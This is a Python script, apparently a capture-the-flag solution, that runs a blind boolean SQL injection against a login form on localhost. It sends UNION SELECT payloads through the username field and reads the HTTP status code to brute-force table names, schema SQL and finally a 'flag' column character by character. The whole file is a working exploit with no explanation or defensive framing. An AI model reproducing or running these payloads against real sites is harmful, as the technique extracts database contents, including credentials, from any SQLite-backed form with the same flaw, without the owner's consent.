import requests

def send_request(payload: str):
    url = 'http://localhost:3333/index.php'
    data = {
        'username' : f"{payload}",
        'password': "2",
    }
    res = requests.post(url=url, data=data, allow_redirects=False)
    return res.status_code

def query_brute_force_length(payload: str, data: dict):
    for i in range(0,100):
        data['i'] = i 
        query = payload.format(**data)
        x = send_request(query)
        if x != 200:
            return i 
        else:
            continue 

def query_brute_force_name(payload: str, data: dict, length: int):
    result = ""
    for i in range(1, length+1):
        for j in range(0,128):
            data ['i'] = i 
            data ['j'] = j
            query = payload.format(**data)
            x = send_request(query)
            if x != 200:
                result += chr(j)
                break
            else: 
                continue
    return result

if __name__ == "__main__":

    payload = {
        "table_length": "' union all select '1', iif(length(name)={i}, '2', '1') FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%' limit {table_order};", 
        "table_name": "' union all select '1', iif(substr(name, {i}, 1)=char({j}), '2', '1') FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%' limit {table_order};",
        "column_length" : "' union all select '1', iif(length(sql)={i}, '2', '1') FROM sqlite_master WHERE tbl_name = '{table_name}' AND type = 'table';",
        "column_name" : "' union all select '1', iif(substr(sql, {i}, 1)=char({j}), '2', '1')  FROM sqlite_master WHERE tbl_name = '{table_name}' AND type = 'table';",
        "flag_length" : "' union all select '1', iif(length({column_name})={i}, '2', '1') FROM {table_name};",
        "flag_name" : "' union all select '1', iif(substr({column_name}, {i}, 1)=char({j}), '2', '1')  FROM {table_name};"
    }

    # table_1 data extraction 
    data = {"table_order": "0,1"}
    table_1_length = query_brute_force_length(data=data, payload=payload['table_length'])
    table_1_name = query_brute_force_name(payload=payload['table_name'], data=data, length=table_1_length)
    print(f"table 1 : {table_1_name}")

    data = {"table_name": table_1_name}
    column_length_table_1 = query_brute_force_length(data=data, payload=payload['column_length'])
    column_name_table_1 = query_brute_force_name(data=data, payload=payload['column_name'], length=column_length_table_1)
    print(f"sql query of table 1 : {column_name_table_1}")

    # table_2 data extraction 
    data = {"table_order": "1,1"}
    table_2_length = query_brute_force_length(data=data, payload=payload['table_length'])
    table_2_name = query_brute_force_name(payload=payload['table_name'], data=data, length=table_2_length)
    print(f"table 2 : {table_2_name}")

    data = {"table_name": table_2_name}
    column_length_table_2 = query_brute_force_length(data=data, payload=payload['column_length'])
    column_name_table_2 = query_brute_force_name(data=data, payload=payload['column_name'], length=column_length_table_2)
    print(f"sql query of table 2 : {column_name_table_2}")
    
    # flag column extraction
    data = {
        "column_name" : "flag",
        "table_name": "flag"
    }
    flag_length = query_brute_force_length(data=data, payload=payload['flag_length'])
    flag_name = query_brute_force_name(data=data, payload=payload['flag_name'], length=flag_length)
    print(f"flag : {flag_name}")
